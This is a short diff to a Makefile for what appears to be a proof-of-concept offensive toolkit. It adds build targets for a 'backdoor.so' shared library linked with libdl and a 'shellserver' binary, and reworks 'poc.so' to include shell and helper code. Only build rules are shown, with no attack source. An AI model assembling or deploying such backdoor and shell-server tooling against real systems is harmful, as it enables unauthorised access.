@@ -7,9 +7,15 @@ all: config poc.so
 config:
 	@python3 config.py > const.h
 
-poc.so: poc.c xor.c
-	gcc -fPIC -g -c poc.c xor.c
-	gcc -fPIC -shared -Wl,-soname,poc.so poc.o xor.o $(LDFLAGS) -o poc.so
+poc.so: poc.c etc.c shell.c
+	gcc -fPIC -g -c poc.c etc.c shell.c
+	gcc -fPIC -shared -Wl,-soname,poc.so poc.o etc.o shell.c $(LDFLAGS) -o poc.so
+
+backdoor.so: backdoor.c
+	gcc -fPIC -shared -o backdoor.so backdoor.c -ldl
+
+sserver: shellserver.c
+	gcc -o shellserver shellserver.c shell.c etc.c -lpthread
 
 install: all
 	@echo [-] Checking the installation dir $(INSTALLDIR)
@@ -21,5 +27,5 @@ install: all
 	@echo [-] Done
 
 clean:
-	rm poc.so *.o
+	rm *.so *.o shellserver
 
